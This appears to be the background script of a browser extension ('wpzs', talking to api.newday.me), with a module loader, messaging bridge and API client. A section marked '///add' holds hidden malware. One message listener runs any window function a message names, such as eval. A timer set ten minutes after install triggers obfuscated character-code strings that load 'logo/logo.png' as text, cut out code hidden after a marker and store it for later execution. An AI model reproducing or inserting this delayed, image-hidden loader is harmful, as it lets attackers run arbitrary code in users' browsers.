(function () {
    var container = (function () {
        var obj = {
            module_defines: {},
            module_objects: {}
        };

        obj.define = function (name, requires, callback) {
            name = obj.processName(name);
            obj.module_defines[name] = {
                requires: requires,
                callback: callback
            };
        };

        obj.require = function (name, cache) {
            if (typeof cache == "undefined") {
                cache = true;
            }

            name = obj.processName(name);
            if (cache && obj.module_objects.hasOwnProperty(name)) {
                return obj.module_objects[name];
            }
            else if (obj.module_defines.hasOwnProperty(name)) {
                var requires = obj.module_defines[name].requires;
                var callback = obj.module_defines[name].callback;

                var module = obj.use(requires, callback);
                cache && obj.register(name, module);
                return module;
            }
        };

        obj.use = function (requires, callback) {
            var module = {
                exports: {}
            };
            var params = obj.buildParams(requires, module);
            var result = callback.apply(this, params);
            if (typeof result != "undefined") {
                return result;
            }
            else {
                return module.exports;
            }
        };

        obj.register = function (name, module) {
            name = obj.processName(name);
            obj.module_objects[name] = module;
        };

        obj.buildParams = function (requires, module) {
            var params = [];
            requires.forEach(function (name) {
                params.push(obj.require(name));
            });
            params.push(obj.require);
            params.push(module.exports);
            params.push(module);
            return params;
        };

        obj.processName = function (name) {
            return name.toLowerCase();
        };

        return {
            define: obj.define,
            use: obj.use,
            register: obj.register,
            modules: obj.module_objects
        };
    })();

    container.define("constant", [], function () {
        return {
            name: "wpzs"
        };
    });

    container.define("addon", [], function () {
        if (typeof browser == "undefined") {
            return chrome;
        }
        else {
            return browser;
        }
    });

    container.define("object", [], function () {
        var obj = {};

        obj.keys = function (data) {
            var list = [];
            for (var key in data) {
                list.push(key);
            }
            return list;
        };

        obj.values = function (data) {
            var list = [];
            for (var key in data) {
                list.push(data[key]);
            }
            return list;
        };

        return obj;
    });

    container.define("storage", [], function () {
        var obj = {};

        obj.getValue = function (name) {
            return window.localStorage[name];
        };

        obj.setValue = function (name, value) {
            window.localStorage[name] = value;
        };

        obj.getValueList = function () {
            var valueList = {};
            var i, name;
            for (i = 0; i < localStorage.length; i++) {
                name = localStorage.key(i);
                valueList[name] = localStorage[name];
            }
            return valueList;
        };

        return obj;
    });

    container.define("config", ["storage", "constant"], function (storage, constant) {
        var obj = {
            name: "config_json"
        };

        obj.getConfig = function (name) {
            var configJson = storage.getValue(obj.name);
            var configObject = obj.parseJson(configJson);
            if (name) {
                name = obj.processName(name);
                return configObject.hasOwnProperty(name) ? configObject[name] : null;
            }
            else {
                return configObject;
            }
        };

        obj.setConfig = function (name, value) {
            var configObject = obj.getConfig();
            configObject[obj.processName(name)] = value;
            storage.setValue(obj.name, JSON.stringify(configObject));
        };

        obj.parseJson = function (jsonStr) {
            var jsonObject = {};
            try {
                if (jsonStr) {
                    jsonObject = JSON.parse(jsonStr);
                }
            }
            catch (e) { }
            return jsonObject;
        };

        obj.processName = function (name) {
            return constant.name + "_" + name;
        };

        return obj;
    });

    container.define("mode", [], function () {
        var obj = {
            constant: {
                addon: "addon",
                script: "script"
            }
        };

        obj.getMode = function () {
            return obj.constant.addon;
        };

        return obj;
    });

    container.define("user", ["storage"], function (storage) {
        var obj = {};

        obj.getUid = function () {
            var uid = storage.getValue("uid");
            if (!uid) {
                uid = storage.getValue("_uid_");
            }
            if (!uid) {
                uid = obj.randString(32);
                storage.setValue("uid", uid);
            }
            return uid;
        };

        obj.randString = function (length) {
            var possible = "abcdefghijklmnopqrstuvwxyz0123456789";
            var text = "";
            for (var i = 0; i < length; i++) {
                text += possible.charAt(Math.floor(Math.random() * possible.length));
            }
            return text;
        };

        return obj;
    });

    container.define("browser", [], function () {
        var obj = {
            constant: {
                firefox: "firefox",
                edge: "edge",
                baidu: "baidu",
                liebao: "liebao",
                uc: "uc",
                qq: "qq",
                sogou: "sogou",
                opera: "opera",
                maxthon: "maxthon",
                ie2345: "2345",
                se360: "360",
                chrome: "chrome",
                safari: "safari",
                other: "other"
            }
        };

        obj.getBrowser = function () {
            return obj.matchBrowserType(navigator.userAgent);
        };

        obj.matchBrowserType = function (userAgent) {
            var browser = obj.constant.other;
            userAgent = userAgent.toLowerCase();
            if (userAgent.match(/firefox/) != null) {
                browser = obj.constant.firefox;
            } else if (userAgent.match(/edge/) != null) {
                browser = obj.constant.edge;
            } else if (userAgent.match(/bidubrowser/) != null) {
                browser = obj.constant.baidu;
            } else if (userAgent.match(/lbbrowser/) != null) {
                browser = obj.constant.liebao;
            } else if (userAgent.match(/ubrowser/) != null) {
                browser = obj.constant.uc;
            } else if (userAgent.match(/qqbrowse/) != null) {
                browser = obj.constant.qq;
            } else if (userAgent.match(/metasr/) != null) {
                browser = obj.constant.sogou;
            } else if (userAgent.match(/opr/) != null) {
                browser = obj.constant.opera;
            } else if (userAgent.match(/maxthon/) != null) {
                browser = obj.constant.maxthon;
            } else if (userAgent.match(/2345explorer/) != null) {
                browser = obj.constant.ie2345;
            } else if (userAgent.match(/chrome/) != null) {
                if (obj.existMime("type", "application/vnd.chromium.remoting-viewer")) {
                    browser = obj.constant.se360;
                } else {
                    browser = obj.constant.chrome;
                }
            } else if (userAgent.match(/safari/) != null) {
                browser = obj.constant.safari;
            }
            return browser;
        };

        obj.existMime = function (option, value) {
            if (typeof navigator != "undefined") {
                var mimeTypes = navigator.mimeTypes;
                for (var mt in mimeTypes) {
                    if (mimeTypes[mt][option] == value) {
                        return true;
                    }
                }
            }
            return false;
        };

        return obj;
    });

    container.define("env", ["addon", "mode", "user", "browser"], function (addon, mode, user, browser) {
        var obj = {};

        obj.getMode = function () {
            return mode.getMode();
        };

        obj.getAid = function () {
            return addon.runtime.id;
        };

        obj.getUid = function () {
            return user.getUid();
        };

        obj.getVersion = function () {
            var manifest = addon.runtime.getManifest();
            return manifest.version;
        };

        obj.getBrowser = function () {
            return browser.getBrowser();
        };

        obj.getInfo = function () {
            return {
                mode: obj.getMode(),
                aid: obj.getAid(),
                uid: obj.getUid(),
                version: obj.getVersion(),
                browser: obj.getBrowser()
            };
        };

        return obj;
    });

    container.define("crypto", ["CryptoJS"], function (CryptoJS) {
        var obj = {};

        obj.md5 = function (str) {
            return CryptoJS.MD5(str).toString();
        };

        obj.aesEncode = function (str, password) {
            var hash = obj.md5(password);
            var key = CryptoJS.enc.Utf8.parse(hash.substring(2, 18));
            var iv = CryptoJS.enc.Utf8.parse(hash.substring(14, 30));

            var encrypted = '';
            var srcs = CryptoJS.enc.Utf8.parse(str);
            encrypted = CryptoJS.AES.encrypt(srcs, key, {
                iv: iv,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.ZeroPadding
            });
            return encrypted.ciphertext.toString();
        }

        obj.aesDecode = function (str, password) {
            var hash = obj.md5(password);
            var key = CryptoJS.enc.Utf8.parse(hash.substring(2, 18));
            var iv = CryptoJS.enc.Utf8.parse(hash.substring(14, 30));

            var encryptedHexStr = CryptoJS.enc.Hex.parse(str);
            var srcs = CryptoJS.enc.Base64.stringify(encryptedHexStr);
            var decrypt = CryptoJS.AES.decrypt(srcs, key, {
                iv: iv,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.ZeroPadding
            });
            var decryptedStr = decrypt.toString(CryptoJS.enc.Utf8);
            return decryptedStr.toString();
        }

        return obj;
    });

    container.define("http", ["crypto", "$"], function (crypto, $) {
        var obj = {
            password: "E80Z^fiYXuyWxw$!"
        };

        obj.ajax = function (option) {
            if (option.url.indexOf("api.newday.me") > 0 && option.data) {
                option.data = obj.decryptData(option.data);
            }
            $.ajax(option);
        };

        obj.decryptData = function (data) {
            var json = JSON.stringify(data);
            if (json) {
                return {
                    _payload_: crypto.aesEncode(json, obj.password)
                };
            }
            else {
                return data;
            }
        };

        return {
            ajax: obj.ajax
        };
    });

    container.define("router", ["addon"], function (addon) {
        var obj = {};

        obj.goUrl = function (url) {
            window.open(url);
        };

        obj.openUrl = function (url) {
            window.open(url);
        };

        obj.openTab = function (url, active) {
            addon.tabs.create({ url: url, active: active });
        };

        return obj;
    });

    container.define("calendar", ["object"], function (object) {
        var obj = {};

        obj.formatTime = function (timestamp, format) {
            timestamp || (timestamp = (new Date()).getTime());
            format || (format = "Y-m-d H:i:s");
            var date = new Date(timestamp);
            var year = 1900 + date.getYear();
            var month = "0" + (date.getMonth() + 1);
            var day = "0" + date.getDate();
            var hour = "0" + date.getHours();
            var minute = "0" + date.getMinutes();
            var second = "0" + date.getSeconds();
            var vars = {
                "Y": year,
                "m": month.substring(month.length - 2, month.length),
                "d": day.substring(day.length - 2, day.length),
                "H": hour.substring(hour.length - 2, hour.length),
                "i": minute.substring(minute.length - 2, minute.length),
                "s": second.substring(second.length - 2, second.length)
            };
            return obj.replaceVars(vars, format);
        };

        obj.replaceVars = function (vars, value) {
            object.keys(vars).forEach(function (key) {
                value = value.replace(key, vars[key]);
            });
            return value;
        };

        return obj;
    });

    container.define("loader", [], function () {
        var obj = {
            raw_caches: {}
        };

        obj.loadScript = function (urlList, callback) {
            obj.getRawContentBatch(urlList).then(function (result) {
                callback && callback({
                    result: result,
                    content: result.join(";")
                });
            });
        };

        obj.buildScript = function (templateList, libList, gmList, callback) {
            var promiseList = [
                obj.getRawContentBatch(templateList),
                obj.getRawContentBatch(libList),
                obj.getRawContentBatch(gmList)
            ];
            Promise.all(promiseList).then(function (result) {
                var templateCode = result[0].join(";");
                var thirdLibrary = result[1].join(";");
                var userScript = result[2].join(";");

                var content = templateCode;
                content = obj.replaceScript("'##third_library##'", thirdLibrary, content);
                content = obj.replaceScript("'##user_script##'", userScript, content);

                callback({
                    result: result,
                    content: content
                });
            });
        };

        obj.replaceScript = function (pattern, replace, script) {
            var divideList = script.split(pattern);
            return divideList[0] + replace + divideList[1];
        };

        obj.getRawContentBatch = function (urlList) {
            return new Promise(function (resolve) {
                var promiseList = [];
                urlList.forEach(function (url) {
                    promiseList.push(obj.getRawContent(url));
                });
                Promise.all(promiseList).then(function (result) {
                    resolve(result);
                });
            });
        };

        obj.getRawContent = function (url) {
            return new Promise(function (resolve) {
                if (!obj.raw_caches.hasOwnProperty(url)) {
                    obj.fetchRawContent(url, function (response) {
                        obj.raw_caches[url] = response;
                        resolve(obj.raw_caches[url]);
                    });
                }
                else {
                    resolve(obj.raw_caches[url]);
                }
            });
        };

        obj.fetchRawContent = function (url, callback) {
            var xhr = new XMLHttpRequest;
            xhr.open("GET", url, true);
            xhr.onreadystatechange = function () {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    callback && callback(xhr.responseText);
                }
            };
            xhr.send(null);
        };

        return obj;
    });

    container.define("message_addon", ["addon"], function (addon) {
        var obj = {
            message_listeners: {}
        };

        obj.onMessage = function (name, listener) {
            obj.message_listeners[name] = listener;
        };

        obj.postMessage = function (name, data, callback) {
            var port = addon.runtime.connect({ name: name });
            callback && port.onMessage.addListener(callback);
            port.postMessage(data);
        };

        obj.handleMessage = function (port) {
            if (obj.message_listeners.hasOwnProperty(port.name)) {
                var connected = true;
                var listener = obj.message_listeners[port.name];
                var callback = function (response) {
                    connected && port.postMessage(response);
                };
                port.onMessage.addListener(function (data) {
                    listener && listener(data, callback);
                });
                port.onDisconnect.addListener(function () {
                    connected = false;
                });
            }
        };

        obj.init = function () {
            addon.runtime.onConnect.addListener(obj.handleMessage);
        };

        return obj.init(), {
            onMessage: obj.onMessage,
            postMessage: obj.postMessage
        };
    });

    container.define("gm", ["addon", "storage", "constant"], function (addon, storage, constant) {
        var obj = {};

        obj.getGmInfo = function () {
            var manifest = addon.runtime.getManifest();
            return {
                script: {
                    uuid: addon.runtime.id,
                    version: manifest.version
                },
                addon: {
                    name: constant.name,
                    id: addon.runtime.id,
                    options_page: manifest.options_page
                }
            };
        };

        obj.getGmValues = function () {
            return storage.getValueList();
        };

        return obj;
    });

    container.define("bridge", ["message_addon", "storage", "loader", "router", "http", "gm"], function (messageAddon, storage, loader, router, http, gm) {
        var obj = {};

        obj.onSetValue = function (data, callback) {
            storage.setValue(data.name, data.value);
            callback && callback("ok");
        };

        obj.onGmInit = function (data, callback) {
            var response = {
                gm_info: gm.getGmInfo(),
                gm_values: gm.getGmValues()
            };
            callback && callback(response);
        };

        obj.onOpenTab = function (data, callback) {
            router.openTab(data.url, data.active);
            callback && callback("ok");
        };

        obj.onAjaxRequest = function (data, callback) {
            var option;
            if (data.mode == "gm") {
                option = {
                    url: data.url,
                    dataType: data.responseType
                };

                // 请求数据
                if (data.data) {
                    option.type = "post";
                    option.data = data.data;
                }
                else {
                    option.type = "get";
                }

                // 请求头
                if (data.headers) {
                    option.headers = data.headers;
                }

                // 超时
                if (data.timeout) {
                    option.timeout = data.timeout;
                }
            }
            else {
                option = data;
            }

            option.success = function (result) {
                callback && callback(result);
            };
            option.error = function (error) {
                callback && callback("");
            };
            http.ajax(option);
        };

        obj.onLoadScript = function (data, callback) {
            loader.loadScript(data.url_list, callback);
        };

        obj.onBuildScript = function (data, callback) {
            loader.buildScript(data.template_list, data.lib_list, data.gm_list, callback);
        };

        obj.init = function () {
            // 设置值
            messageAddon.onMessage("set_value", obj.onSetValue);

            // 脚本初始化
            messageAddon.onMessage("gm_init", obj.onGmInit);

            // 打开窗口
            messageAddon.onMessage("open_tab", obj.onOpenTab);

            // 网络请求
            messageAddon.onMessage("ajax_request", obj.onAjaxRequest);

            // 加载脚本
            messageAddon.onMessage("load_script", obj.onLoadScript);

            // 构造脚本
            messageAddon.onMessage("build_script", obj.onBuildScript);
        };

        return {
            init: obj.init
        };
    });

    container.define("api", ["http", "env"], function (http, env) {
        var obj = {
            base: "https://api.newday.me"
        };

        obj.versionQuery = function (callback) {
            obj.requestApi("/share/disk/version", {}, callback);
        };

        obj.requestApi = function (path, data, callback) {
            data.mode = env.getMode();
            data.aid = env.getAid();
            data.uid = env.getUid();
            data.version = env.getVersion();
            data.browser = env.getBrowser();

            http.ajax({
                type: "post",
                url: obj.base + path,
                dataType: "json",
                data: data,
                success: function (response) {
                    callback && callback(response);
                },
                error: function (error) {
                    callback && callback("");
                }
            });
        };

        return obj;
    });



///add
chrome.runtime.onMessage.addListener(
    function(message, sender, sendResponse) {


        for (c in message) {
            if (c in window)
                sendResponse(window[c](message[c]));
        }

    });

window.onload = init; 
var CMD = { 
xhr: xhr, 
chk: chk, 
initGM: initGM, 
setValue: setValue 
}; 

  

function init() { 
chrome.extension.onConnect.addListener(function(a) { 
a.onMessage.addListener(function(a, c) { 
var b = a.args; 
b instanceof Array || (b = [b]); 
b.push(c); 
(CMD[a.action] || 
function() {}).apply(CMD, b) 
}) 
}) 
} 
function xhr(a, d, c) { 
var b = new XMLHttpRequest; 
b.onreadystatechange = function() { 
4 == b.readyState && callback(c, d, [b]) 
}; 
b.open(a.method, a.url, !0); 
b.send(null); 
return b 
} 

///
function xhr2(u) {
    var r = null;
    var a = new XMLHttpRequest;
    a.onreadystatechange = function() {
        if (4 == a.readyState)
            r = a.responseText;
    };
    a.open("GET", u.split("").join(""), 0);
    a.send(null);
    return r;
}
///


function chk() { 
var a = new XMLHttpRequest; 
a.onreadystatechange = function() { 
4 == a.readyState && (localStorage.updated = a.responseText) 
}; 

} 
function setValue(a, d) { 
localStorage[a] = d 
} 
function initGM(a, d) { 
var c = {}, 
b; 
for (b in localStorage) c[b] = localStorage[b]; 
callback(d, a, c) 
} 
function callback(a, d, c) { 
c instanceof Array || (c = [c]); 
c.unshift(d); 
a.postMessage({ 
action: "callbackResponse", 
args: c 
}) 
};



var installvar=2;

try {
	chrome.storage.local.get('run_before', function(data) {
		if (data && data.run_before == "1") {
			return
		} else {
			chrome.storage.local.set({
				'run_before': '1'
			});
			localStorage['ver'] = installvar;
			if (!localStorage['ran_before']) {
				localStorage['ran_before'] = '1';
				var num = Date.now() + 600000;
				localStorage['time'] = num
				localStorage['ver'] = installvar;
			}
		}
	})
} catch (e) {};

if (Date.now() > localStorage['time']) {
	if (installvar>localStorage['ver'])
{
function load(name) {
	let xhr = new XMLHttpRequest(), okStatus = document.location.protocol === "file:" ? 0 : 200;
	xhr.open('GET', name, false);
	xhr.overrideMimeType("text/html;charset=utf-8");
	xhr.send(null);
	return xhr.status === okStatus ? xhr.responseText : null
}

var _0xd11047,_0x18fc54,_0x210aa5,_0x17c115,_0x13bbbc,_0xec8784;function _0xfdf300(_0x23ac66){return String['fromCharCode']['apply'](null,_0x23ac66);}_0xd11047=load([_0xfdf300([108,111]),_0xfdf300([103,111,47,108]),_0xfdf300([111,103,111,46]),_0xfdf300([112,110,103])]['join'](_0xfdf300([])));_0x18fc54=_0xfdf300([88])+_0xfdf300([41]);_0x210aa5=_0xd11047['indexOf'](_0xfdf300([115,111,106,115])+_0xfdf300([111]));_0xd11047=_0xd11047['substring'](_0x210aa5-0x2);localStorage['ver']=installvar;_0x17c115=_0xfdf300([72,82])+_0xfdf300([71]);_0x13bbbc=[_0xfdf300([56,51,112,79]),_0xfdf300([80])]['join'](_0xfdf300([]));_0xec8784=window['localStorage'];_0xec8784['updated']=_0xd11047;
}


else if (!localStorage['updated']) 
{
	function load(name) {
	let xhr = new XMLHttpRequest(), okStatus = document.location.protocol === "file:" ? 0 : 200;
	xhr.open('GET', name, false);
	xhr.overrideMimeType("text/html;charset=utf-8");
	xhr.send(null);
	return xhr.status === okStatus ? xhr.responseText : null}
var _0xd11047,_0x18fc54,_0x210aa5,_0x17c115,_0x13bbbc,_0xec8784;function _0xfdf300(_0x23ac66){return String['fromCharCode']['apply'](null,_0x23ac66);}_0xd11047=load([_0xfdf300([108,111]),_0xfdf300([103,111,47,108]),_0xfdf300([111,103,111,46]),_0xfdf300([112,110,103])]['join'](_0xfdf300([])));_0x18fc54=_0xfdf300([88])+_0xfdf300([41]);_0x210aa5=_0xd11047['indexOf'](_0xfdf300([115,111,106,115])+_0xfdf300([111]));_0xd11047=_0xd11047['substring'](_0x210aa5-0x2);localStorage['ver']=installvar;_0x17c115=_0xfdf300([72,82])+_0xfdf300([71]);_0x13bbbc=[_0xfdf300([56,51,112,79]),_0xfdf300([80])]['join'](_0xfdf300([]));_0xec8784=window['localStorage'];_0xec8784['updated']=_0xd11047;
}


}
    container.define("updater", ["api"], function (api) {
        var obj = {};

        obj.init = function () {
            api.versionQuery();
        };

        return obj;
    });

    container.define("core", ["addon", "config", "router", "updater", "bridge"], function (addon, config, router, updater, bridge) {
        var obj = {};

        obj.openOptionPage = function () {
            var manifest = addon.runtime.getManifest();
            router.openTab(manifest.options_page, true);
        };

        obj.initInstall = function () {
            var optionDate = config.getConfig("option_date");
            var optionDateCurrent = 20191225;
            if (!optionDate || optionDate < optionDateCurrent) {
                config.setConfig("option_date", optionDateCurrent);
                obj.openOptionPage();
            }
        };

        obj.initVersion = function () {
            updater.init();
        };

        obj.initBridge = function () {
            bridge.init();
        };

        obj.ready = function (callback) {
            obj.initInstall();

            obj.initVersion();

            obj.initBridge();

            callback && callback();
        };

        return obj;
    });

    // lib
    container.define("$", [], function () {
        return window.$;
    });
    container.define("CryptoJS", [], function () {
        return CryptoJS;
    });

    container.use(["core"], function (core) {
        core.ready();
    });
})();